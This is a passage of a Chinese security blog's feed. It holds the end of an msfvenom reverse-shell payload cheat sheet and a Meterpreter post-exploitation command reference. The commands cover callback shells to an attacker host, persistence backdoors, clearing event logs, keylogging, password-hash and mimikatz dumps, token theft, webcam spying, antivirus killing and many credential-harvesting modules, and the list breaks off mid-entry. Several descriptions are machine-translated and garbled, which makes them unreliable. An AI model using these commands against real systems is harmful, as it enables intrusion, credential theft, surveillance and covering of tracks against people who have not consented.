LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</div></pre></td></tr></table></figure><h4 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</div></pre></td></tr></table></figure><h4 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p python/meterpreter/reverser_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</div></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><h3 id="How-to-use-msfvenom"><a href="#How-to-use-msfvenom" class="headerlink" title="How-to-use-msfvenom"></a><a href="https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom" target="_blank" rel="external">How-to-use-msfvenom</a></h3><h3 id="MSFvenom"><a href="#MSFvenom" class="headerlink" title="MSFvenom"></a><a href="https://www.offensive-security.com/metasploit-unleashed/msfvenom/" target="_blank" rel="external">MSFvenom</a></h3>]]></content>
    
    <summary type="html">
    
      &lt;div id=&quot;aplayer2&quot; class=&quot;aplayer&quot; style=&quot;margin-bottom: 20px;&quot;&gt;&lt;/div&gt;
		&lt;script&gt;
			new APlayer({
				element: document.getElementById(&quot;aplayer2&quot;),
				narrow: false,
				autoplay: true,
				showlrc: 0,
				music: {
					title: &quot;六月的雨&quot;,
					author: &quot;胡歌&quot;,
					url: &quot;/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3&quot;,
					pic: &quot;/Music/233.jpg&quot;,
				}
			});
		&lt;/script&gt;
    
    </summary>
    
    
      <category term="Metasploit-Framework" scheme="https://damit5.com/tags/Metasploit-Framework/"/>
    
  </entry>
  
  <entry>
    <title>Meterpreter 常用命令和后渗透</title>
    <link href="https://damit5.com/2017/09/30/Meterpreter-%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%92%8C%E5%90%8E%E6%B8%97%E9%80%8F/"/>
    <id>https://damit5.com/2017/09/30/Meterpreter-常用命令和后渗透/</id>
    <published>2017-09-30T05:51:58.000Z</published>
    <updated>2018-06-10T03:47:11.107Z</updated>
    
    <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><div id="aplayer1" class="aplayer" style="margin-bottom: 20px;"></div><script>new APlayer({element: document.getElementById("aplayer1"),narrow: false,autoplay: true,showlrc: 0,music: {title: "六月的雨",author: "胡歌",url: "/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3",pic: "/Music/233.jpg",}});</script><p>整理在一起，用的时候也比较方便</p><a id="more"></a><h2 id="核心命令"><a href="#核心命令" class="headerlink" title="核心命令"></a>核心命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">?   #帮助菜单</div><div class="line">background   #将当前会话移动到背景</div><div class="line">bgkill   #杀死一个背景 meterpreter 脚本</div><div class="line">bglist   #提供所有正在运行的后台脚本的列表</div><div class="line">bgrun   #作为一个后台线程运行脚本</div><div class="line">channel   #显示活动频道</div><div class="line">close   #关闭通道</div><div class="line">exit   #终止 meterpreter 会话</div><div class="line">help   #帮助菜单</div><div class="line">interact   #与通道进行交互</div><div class="line">irb   #进入 Ruby 脚本模式</div><div class="line">migrate   #移动到一个指定的 PID 的活动进程 eg:migrate 110</div><div class="line">quit   #终止 meterpreter 会话</div><div class="line">read   #从通道读取数据</div><div class="line">run   #执行以后它选定的 meterpreter 脚本</div><div class="line">use   #加载 meterpreter 的扩展</div><div class="line">write   #将数据写入到一个通道</div></pre></td></tr></table></figure><h2 id="文件系统命令"><a href="#文件系统命令" class="headerlink" title="文件系统命令"></a>文件系统命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">cat   #读取并输出到标准输出文件的内容</div><div class="line">cd   #更改目录对受害人</div><div class="line">del   #删除文件对受害人</div><div class="line">download  #从受害者系统文件下载</div><div class="line">edit  #用 vim编辑文件</div><div class="line">getlwd   #打印本地目录</div><div class="line">getwd   #打印工作目录</div><div class="line">lcd   #更改本地目录</div><div class="line">lpwd   #打印本地目录</div><div class="line">ls   #列出在当前目录中的文件列表</div><div class="line">mkdir   #在受害者系统上的创建目录</div><div class="line">pwd   #输出工作目录</div><div class="line">rm   #删除文件</div><div class="line">rmdir   #受害者系统上删除目录</div><div class="line">upload  #从攻击者的系统往受害者系统上传文件</div></pre></td></tr></table></figure><h2 id="网络命令"><a href="#网络命令" class="headerlink" title="网络命令"></a>网络命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">ipconfig  #显示网络接口的关键信息，包括 IP 地址、 等。</div><div class="line">portfwd  #端口转发</div><div class="line">route  #查看或修改受害者路由表</div></pre></td></tr></table></figure><h2 id="系统命令"><a href="#系统命令" class="headerlink" title="系统命令"></a>系统命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">clearav   #清除了受害者的计算机上的事件日志</div><div class="line">drop_token   #被盗的令牌</div><div class="line">execute  #执行命令</div><div class="line">getpid   #获取当前进程 ID (PID)</div><div class="line">getprivs   #尽可能获取尽可能多的特权</div><div class="line">getuid   #获取作为运行服务器的用户</div><div class="line">kill   #终止指定 PID 的进程</div><div class="line">ps   #列出正在运行的进程</div><div class="line">reboot  #重新启动受害人的计算机</div><div class="line">reg   #与受害人的注册表进行交互</div><div class="line">rev2self   #在受害者机器上调用 RevertToSelf()</div><div class="line">shell   #在受害者计算机上打开一个shell</div><div class="line">shutdown  #关闭了受害者的计算机</div><div class="line">steal_token   #试图窃取指定的 (PID) 进程的令牌</div><div class="line">sysinfo   #获取有关受害者计算机操作系统和名称等的详细信息</div></pre></td></tr></table></figure><h2 id="用户界面命令"><a href="#用户界面命令" class="headerlink" title="用户界面命令"></a>用户界面命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">enumdesktops   #列出所有可访问台式机</div><div class="line">getdesktop   #获取当前的 meterpreter 桌面</div><div class="line">idletime   #检查长时间以来，受害者系统空闲进程</div><div class="line">keyscan_dump   #键盘记录软件的内容转储</div><div class="line">keyscan_start   #启动时与如 Word 或浏览器的进程相关联的键盘记录软件</div><div class="line">keyscan_stop   #停止键盘记录软件</div><div class="line">screenshot  #抓取 meterpreter 桌面的屏幕截图</div><div class="line">set_desktop   #更改 meterpreter 桌面</div><div class="line">uictl   #启用用户界面组件的一些控件</div></pre></td></tr></table></figure><h2 id="特权升级命令"><a href="#特权升级命令" class="headerlink" title="特权升级命令"></a>特权升级命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">getsystem   #获得系统管理员权限</div></pre></td></tr></table></figure><h2 id="密码转储命令"><a href="#密码转储命令" class="headerlink" title="密码转储命令"></a>密码转储命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">hashdump   #抓取哈希密码 (SAM) 文件中的值</div><div class="line"># 请注意 hashdump 会可以跳过杀毒软件，但现在有两个脚本，都更加隐蔽，”run hashdump”和”run smart_hashdump”。</div><div class="line"></div><div class="line">load mimikatz   #加载</div><div class="line">wdigest         #读取用户明文密码</div></pre></td></tr></table></figure><h2 id="维持权限命令"><a href="#维持权限命令" class="headerlink" title="维持权限命令"></a>维持权限命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">run  persistence -X  -i  5  -p &lt;your_port&gt;  -r &lt;your_ip&gt; </div><div class="line"></div><div class="line">-X 在目标主机上开机自启动</div><div class="line">-i  不断尝试反向连接的时间间隔</div></pre></td></tr></table></figure><h2 id="Timestomp-命令"><a href="#Timestomp-命令" class="headerlink" title="Timestomp 命令"></a>Timestomp 命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">timestomp   #修改文件时间戳</div></pre></td></tr></table></figure><h2 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a>其他命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">webcam_list   #列举摄像头</div><div class="line">webcam_snap   #拍照</div><div class="line">wencam_stream   #监控视频</div></pre></td></tr></table></figure><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><blockquote><p>在获得meterpreter的session后，除了meterpreter本身内置的一些基本功能，在<code>/usr/share/metasploit-framework/scripts/meterpreter</code>下面还有很多scripts，提供了很多额外功能，非常好用</p><p>我们可以通过 <code>run 脚本名</code> 来进行使用</p><p><code>run 脚本名 -h</code> 可以查看帮助</p><p>以下翻译来自Google</p><h2 id="原文"><a href="#原文" class="headerlink" title="原文"></a><a href="https://null-byte.wonderhowto.com/how-to/hack-like-pro-ultimate-list-hacking-scripts-for-metasploits-meterpreter-0149339/" target="_blank" rel="external">原文</a></h2><h2 id="部分翻译参考"><a href="#部分翻译参考" class="headerlink" title="部分翻译参考"></a><a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=9119&amp;highlight=meterpreter" target="_blank" rel="external">部分翻译参考</a></h2></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div></pre></td><td class="code"><pre><div class="line">arp_scanner.rb  #利用arp进行存货主机扫描。</div><div class="line">autoroute.rb  #Meterpreter会话，无需背景当前会话。</div><div class="line">checkvm.rb  #用于检测目标主机是否为虚拟机的脚本。</div><div class="line">credcollect.rb  #收集主机上找到的凭据的脚本，并将其存储在数据库中。</div><div class="line">domain_list_gen.rb  #用于提取域管理员帐户列表以供使用的脚本。</div><div class="line">dumplinks.rb  #从用户最近的文档文件夹和Microsoft Office的Recent Documents文件夹（如果存在）中，Dumplinks解析.lnk文件。.lnk文件包含时间戳，文件位置，包括共享名称，卷序列号等。此信息可能有助于您瞄准其他系统。</div><div class="line">duplicate.rb  #再次产生payload，注入到其他进程或打开新程序并注入其中</div><div class="line">enum_chrome.rb  #从chrome安装中提取数据的脚本。</div><div class="line">enum_firefox.rb  #从Firefox中提取数据的脚本。</div><div class="line">enum_logged_on_users.rb  #用于枚举登录到系统的当前记录的用户和用户的脚本。</div><div class="line">enum_powershell_env.rb  #枚举PowerShell和WSH配置。</div><div class="line">enum_putty.rb  #枚举Putty连接。</div><div class="line">enum_shares.rb  #用于枚举所提供股票的脚本和挂载股票的历史。</div><div class="line">enum_vmware.rb  #枚举VMware产品的VMware配置。</div><div class="line">event_manager.rb  #显示目标系统上的事件日志信息及其配置。</div><div class="line">file_collector.rb  #用于搜索和下载与特定模式匹配的文件的脚本。</div><div class="line">get_application_list.rb  #用于提取已安装应用程序及其版本的列表的脚本。</div><div class="line">getcountermeasure.rb  #用于检测AV，HIPS，第三方防火墙，DEP配置和Windows防火墙配置的脚本。还提供杀死检测到的产品的过程并禁用内置防火墙的选项。</div><div class="line">get_env.rb  #用于提取所有系统和用户环境变量列表的脚本。</div><div class="line">getfilezillacreds.rb  #从Filezilla中提取服务器和凭据的脚本。</div><div class="line">getgui.rb  #启用Windows RDP的脚本。</div><div class="line">get_local_subnets.rb  #根据主机的路由获取本地子网列表。</div><div class="line">get_pidgen_creds.rb  #使用用户名和密码提取配置的服务的脚本。</div><div class="line">gettelnet.rb  #检查是否安装了telnet。</div><div class="line">get_valid_community.rb  #从SNMP获取一个有效的社区字符串。</div><div class="line">getvncpw.rb  #获取VNC密码。</div><div class="line">hashdump.rb  #从SAM获取密码散列。</div><div class="line">hostedit.rb  #将条目添加到Windows主机文件的脚本。</div><div class="line">keylogrecorder.rb  #运行键盘记录器并保存所有按键的脚本。</div><div class="line">killav.rb  #终止几乎每个受害者的防病毒软件。</div><div class="line">metsvc.rb  #删除一台服务器并启动另一台服务器。</div><div class="line">migrate  #将计量器服务移动到另一个进程。</div><div class="line">multicommand.rb  #在Windows 2003，Windows Vista和Windows XP和Windows 2008目标上运行多个命令的脚本。</div><div class="line">multi_console_command.rb  #用于在计量器会话上运行多个控制台命令的脚本。</div><div class="line">multi_meter_inject.rb  #用于注入reverce的脚本tcp Meterpreter有效负载到多个PID的内存中，如果没有提供记事本进程将创建一个Meterpreter有效负载。</div><div class="line">multiscript.rb  #在Meterpreter会话上运行多个脚本的脚本。</div><div class="line">netenum.rb  #在Windows 2003，Windows Vista，Windows 2008和Windows XP上使用本机Windows命令进行ping扫描的脚本。</div><div class="line">packetrecorder.rb  #用于捕获到PCAP文件的数据包的脚本。</div><div class="line">panda2007pavsrv51.rb  #此模块利用Panda Antivirus 2007中的特权升级漏洞。由于不安全的权限问题，本地攻击者可以获得提升的权限。</div><div class="line">persistence.rb  #用于在目标主机上创建持久性后门的脚本。</div><div class="line">pml_driver_config.rb  #利用Hewlett-Packard的PML驱动程序HPZ12中的权限升级漏洞。由于不安全的SERVICE_CHANGE_CONFIG DACL权限，本地攻击者可以获得提升的权限。</div><div class="line">powerdump.rb  #Meterpreter脚本，用于利用纯PowerShell通过注册表项提取用户名和密码哈希。该脚本需要您作为系统运行才能正常工作。目前已经在Server 2008和Windows 7上进行了测试，默认情况下安装PowerShell。</div><div class="line">prefetchtool.rb  #从Windows prefetch文件夹中提取信息的脚本。</div><div class="line">process_memdump.rb  #脚本是基于纸张神经外科与Meterpreter。</div><div class="line">remotewinenum.rb  #此脚本将枚举目标环境中的Windows主机，给定用户名和密码，或使用WMI wmic Windows本机工具运行Meterpeter的凭据。</div><div class="line">scheduleme.rb  #用于自动化最常见的调度任务的脚本。此脚本适用于Windows XP，Windows 2003，Windows Vista和Windows 2008。</div><div class="line">schelevator.rb  #利用Windows Vista / 7/2008 Task Scheduler 2.0特权提升。该脚本利用Stuxnet利用的Task Scheduler 2.0 XML 0day。</div><div class="line">schtasksabuse.rb  #通过调度和运行针对一个或多个目标的命令列表来在Windows中滥用调度程序服务的Meterpreter脚本。使用schtasks命令将其作为系统运行。此脚本适用于Windows XP，Windows 2003，Windows Vista和Windows 2008。</div><div class="line">scraper.rb  #此脚本的目标是通过现有的Meterpreter会话从受害者获取系统信息。</div><div class="line">screenspy.rb  #此脚本将打开远程主机的交互视图。您将需要在您的机器上安装Firefox。</div><div class="line">screen_unlock.rb  #解锁Windows屏幕的脚本。需要系统特权才能运行和已知的目标系统的签名。</div><div class="line">screen_dwld.rb  #递归搜索和下载与给定模式匹配的文件的脚本。</div><div class="line">service_manager.rb  #用于管理Windows服务的脚本。</div><div class="line">service_permissions_escalate.rb此脚本尝试创建一个服务，然后通过现有服务列表进行搜索，以查找不安全的文件或配置权限，使其可以用有效载荷替换可执行文件。然后它将尝试重新启动替换的服务以运行有效载荷。如果失败，下次启动服务（例如重新启动），攻击者将获得提升的权限。</div><div class="line">sound_recorder.rb  #用于以间隔录制由目标主机麦克风捕获的声音的脚本。</div><div class="line">srt_webdrive_priv.rb  #利用South River Technologies WebDrive中的权限升级漏洞。</div><div class="line">uploadexec.rb  #将可执行文件上传到主机的脚本。</div><div class="line">virtualbox_sysenter_dos  #脚本到DoS虚拟框。</div><div class="line">virusscan_bypass.rb  #杀死McAfee VirusScan Enterprise v8.7.0i +进程的脚本。</div><div class="line">vnc.rb  #用于获取快速VNC会话的Meterpreter脚本。</div><div class="line">webcam.rb  #从主机摄像头启用和捕获图像的脚本。</div><div class="line">win32-sshclient.rb  #部署和运行“plink”命令行ssh-client的脚本。仅支持MS-Windows-2k / XP / Vista主机。</div><div class="line">win32-sshserver.rb  #在目标机器上部署和运行OpenSSH的脚本。</div><div class="line">winbf.rb  #检查当前系统密码策略的功能。此策略可能类似于目标环境中其他服务器的策略。</div><div class="line">winenum.rb  #枚举Windows系统，包括环境变量，网络接口，路由，用户帐户等</div><div class="line">wmic.rb  #用于在Windows 2003，Windows Vista和Windows XP和Windows 2008目标上运行WMIC命令的脚本。</div></pre></td></tr></table></figure><h2 id="后渗透攻击模块-Post"><a href="#后渗透攻击模块-Post" class="headerlink" title="后渗透攻击模块 (Post)"></a>后渗透攻击模块 (Post)</h2><blockquote><p>在meterpreter下按两下tab键，有几百个post模块，可以多尝试使用</p><p>以下内容均有Google自动翻译，如有错误请查看源文件</p></blockquote><h4 id="模块信息"><a href="#模块信息" class="headerlink" title="模块信息"></a>模块信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">info 模块名</div></pre></td></tr></table></figure><h4 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">run 模块名</div><div class="line"></div><div class="line">example:</div><div class="line">run post/windows/gather/enum_logged_on_users  #目标主机当前在线的用户(SID=500是管理员账号)</div></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div></pre></td><td class="code"><pre><div class="line">post/multi/gather/env                                              目标主机环境变量信息</div><div class="line">post/multi/gather/firefox_creds                                    目标主机火狐浏览器保存的账号密码</div><div class="line">post/multi/gather/ssh_creds                                        目标主机保存的ssh身份验证信息(linux系统常用)</div><div class="line">post/windows/capture/keylog_recorder                               Windows捕获击键记录器</div><div class="line">post/windows/capture/lockout_keylogger                             Windows捕获Winlogon锁定证书键盘记录器</div><div class="line">post/windows/escalate/droplnk                                      Windows升级SMB图标LNK Dropper</div><div class="line">post/windows/escalate/getsystem                                    Windows通过管理员升级获取系统</div><div class="line">post/windows/escalate/golden_ticket                                Windows升级金票</div><div class="line">post/windows/escalate/ms10_073_kbdlayout                           Windows Escalate NtUserLoadKeyboardLayoutEx特权升级</div><div class="line">post/windows/escalate/screen_unlock                                Windows Escalate Locked Desktop Unlocker</div><div class="line">post/windows/gather/ad_to_sqlite                                   AD计算机，组和本地SQLite DB的递归用户成员资格</div><div class="line">post/windows/gather/arp_scanner                                    Windows收集ARP扫描器</div><div class="line">post/windows/gather/bitcoin_jacker                                 Windows收集比特币钱包</div><div class="line">post/windows/gather/bitlocker_fvek                                 Bitlocker主键（FVEK）提取</div><div class="line">post/windows/gather/cachedump                                      Windows收集凭证缓存转储</div><div class="line">post/windows/gather/checkvm                                        Windows收集虚拟环境检测</div><div class="line">post/windows/gather/credentials/avira_password                     Windows收集Avira密码提取</div><div class="line">post/windows/gather/credentials/bulletproof_ftp                    Windows收集BulletProver FTP客户端保存的密码提取</div><div class="line">post/windows/gather/credentials/coreftp                            Windows收集CoreFTP保存的密码提取</div><div class="line">post/windows/gather/credentials/credential_collector               Windows收集凭证收集器</div><div class="line">post/windows/gather/credentials/domain_hashdump                    Windows域控制器Hashdump</div><div class="line">post/windows/gather/credentials/dynazip_log                        Windows收集DynaZIP保存的密码提取</div><div class="line">post/windows/gather/credentials/dyndns                             Windows收集DynDNS客户端密码提取器</div><div class="line">post/windows/gather/credentials/enum_cred_store                    Windows收集证书存储枚举和解密模块</div><div class="line">post/windows/gather/credentials/enum_laps                          Windows收集证书本地管理员密码解决方案</div><div class="line">post/windows/gather/credentials/enum_picasa_pwds                   Windows收集Google Picasa密码提取器</div><div class="line">post/windows/gather/credentials/epo_sql                            Windows收集McAfee ePO 4.6配置SQL凭据</div><div class="line">post/windows/gather/credentials/filezilla_server                   Windows收集FileZilla FTP服务器凭据集合</div><div class="line">post/windows/gather/credentials/flashfxp                           Windows收集FlashFXP保存的密码提取</div><div class="line">post/windows/gather/credentials/ftpnavigator                       Windows收集FTP导航器保存密码提取</div><div class="line">post/windows/gather/credentials/ftpx                               Windows收集FTP资源管理器（FTPX）凭据提取</div><div class="line">post/windows/gather/credentials/gpp                                Windows收集组策略优先保存的密码</div><div class="line">post/windows/gather/credentials/heidisql                           Windows收集HeidiSQL保存的密码提取</div><div class="line">post/windows/gather/credentials/idm                                Windows收集Internet下载管理器（IDM）密码提取器</div><div class="line">post/windows/gather/credentials/imail                              Windows收集IPSwitch iMail用户数据枚举</div><div class="line">post/windows/gather/credentials/imvu                               Windows收集证书IMVU游戏客户端</div><div class="line">post/windows/gather/credentials/mcafee_vse_hashdump                McAfee病毒扫描企业密码破解转储</div><div class="line">post/windows/gather/credentials/mdaemon_cred_collector             Windows收集MDaemonEmailServer证书破解</div><div class="line">post/windows/gather/credentials/meebo                              Windows收集Meebo密码提取器</div><div class="line">post/windows/gather/credentials/mremote                            Windows收集mRemote保存的密码提取</div><div class="line">post/windows/gather/credentials/mssql_local_hashdump               Windows收集本地SQL Server哈希转储</div><div class="line">post/windows/gather/credentials/nimbuzz                            Windows收集Nimbuzz Instant Messenger密码提取器</div><div class="line">post/windows/gather/credentials/outlook                            Windows收集Microsoft Outlook保存的密码提取</div><div class="line">post/windows/gather/credentials/razer_synapse                      Windows收集Razer Synapse密码提取</div><div class="line">post/windows/gather/credentials/razorsql                           Windows收集RazorSQL证书</div><div class="line">post/windows/gather/credentials/rdc_manager_creds                  Windows收集远程桌面连接管理器保存的密码提取</div><div class="line">post/windows/gather/credentials/skype                              Windows收集Skype保存的密码哈希提取</div><div class="line">post/windows/gather/credentials/smartermail                        Windows收集更智能的邮件密码提取</div><div class="line">post/windows/gather/credentials/smartftp                           Windows收集SmartFTP保存的密码提取</div><div class="line">post/windows/gather/credentials/spark_im                           Windows收集Spark IM密码提取</div><div class="line">post/windows/gather/credentials/sso                                Windows单一登录凭证收集器（Mimikatz）</div><div class="line">post/windows/gather/credentials/steam                              Windows收集Steam客户端会话收集器。</div><div class="line">post/windows/gather/credentials/tortoisesvn                        Windows收集TortoiseSVN保存的密码提取</div><div class="line">post/windows/gather/credentials/total_commander                    Windows收集Total Commander保存的密码提取</div><div class="line">post/windows/gather/credentials/trillian                           Windows收集Trillian密码提取器</div><div class="line">post/windows/gather/credentials/vnc                                Windows收集VNC密码提取</div><div class="line">post/windows/gather/credentials/windows_autologin                  Windows收集AutoLogin用户凭据提取器</div><div class="line">post/windows/gather/credentials/winscp                             Windows收集WinSCP保存的密码提取</div><div class="line">post/windows/gather/credentials/wsftp_client                       Windows收集WS_FTP保存的密码提取</div><div class="line">post/windows/gather/dnscache_dump                                  Windows收集DNS缓存</div><div class="line">post/windows/gather/dumplinks                                      Windows收集最近的文件lnk信息</div><div class="line">post/windows/gather/enum_ad_bitlocker                              Windows收集Active Directory BitLocker恢复</div><div class="line">post/windows/gather/enum_ad_computers                              Windows收集Active Directory计算机</div><div class="line">post/windows/gather/enum_ad_groups                                 Windows收集Active Directory组</div><div class="line">post/windows/gather/enum_ad_managedby_groups                       Windows收集Active Directory托管组</div><div class="line">post/windows/gather/enum_ad_service_principal_names                Windows收集Active Directory服务主体名称</div><div class="line">post/windows/gather/enum_ad_to_wordlist                            Windows Active Directory Wordlist Builder</div><div class="line">post/windows/gather/enum_ad_user_comments                          Windows收集Active Directory用户评论</div><div class="line">post/windows/gather/enum_ad_users                                  Windows收集Active Directory用户</div><div class="line">post/windows/gather/enum_applications                              Windows收集安装的应用程序枚举</div><div class="line">post/windows/gather/enum_artifacts                                 Windows收集文件和注册表伪像枚举</div><div class="line">post/windows/gather/enum_av_excluded                               Windows防病毒排除枚举</div><div class="line">post/windows/gather/enum_chrome                                    Windows收集Google Chrome用户数据枚举</div><div class="line">post/windows/gather/enum_computers                                 Windows收集枚举计算机</div><div class="line">post/windows/gather/enum_db                                        Windows收集数据库实例枚举</div><div class="line">post/windows/gather/enum_devices                                   Windows收集硬件枚举</div><div class="line">post/windows/gather/enum_dirperms                                  Windows收集目录权限枚举</div><div class="line">post/windows/gather/enum_domain                                    Windows收集枚举域</div><div class="line">post/windows/gather/enum_domain_group_users                        